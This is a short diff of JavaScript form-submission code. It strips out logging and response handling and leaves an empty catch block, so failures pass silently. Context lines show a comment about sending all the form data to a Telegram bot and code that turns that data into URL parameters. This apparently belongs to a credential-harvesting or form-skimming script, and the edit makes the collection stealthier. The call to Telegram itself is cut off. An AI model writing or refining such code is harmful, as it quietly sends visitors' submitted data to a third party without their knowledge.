@@ -127,12 +127,8 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
-        }).then(response => response.json())
-          .then(data => console.log('Form submitted:', data))
-          .catch(err => console.log('Error submitting form:', err));
-      } catch (e) {
-        console.error("Error in fetch request:", e);
-      }
+        });
+      } catch (e) {}
 
       // Send all data to Telegram bot via /start
       const params = new URLSearchParams(data).toString();
